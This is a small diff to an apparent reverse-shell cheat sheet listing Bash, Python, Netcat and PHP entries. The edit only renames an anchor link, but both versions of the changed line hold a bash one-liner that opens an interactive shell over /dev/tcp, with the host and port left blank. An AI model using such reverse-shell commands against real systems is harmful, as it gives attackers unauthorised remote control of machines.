@@ -1,7 +1,7 @@
 ____
 
 ### Reverse shell
-* #### [Bash](#bash)
+* #### [Bash](#reverse_shell_bash)
 * #### Python
 * #### Netcat
 * #### PHP
@@ -64,4 +64,4 @@ ____
 ____
 
 #### Reverse shell > bash
-###### <a name="bash"></a>  bash -c 'exec bash -i &>/dev/tcp// <&1'
+###### <a name="reverse_shell_bash"></a>bash -c 'exec bash -i &>/dev/tcp// <&1'
